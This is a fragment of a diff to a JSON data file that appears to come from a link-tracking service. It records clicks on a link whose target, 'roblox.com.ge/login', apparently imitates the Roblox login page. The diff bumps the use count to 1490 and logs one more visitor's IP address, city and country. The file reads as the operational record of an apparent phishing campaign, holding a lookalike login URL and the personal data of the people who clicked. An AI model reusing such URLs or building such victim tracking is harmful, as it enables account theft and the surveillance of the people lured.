@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1489,
+    "useCount": 1490,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12078,6 +12078,14 @@
         "ip": "112.211.32.5",
         "country": "Philippines",
         "city": "Pasay",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777440475896,
+        "ip": "139.135.200.34",
+        "country": "Philippines",
+        "city": "Taysan",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
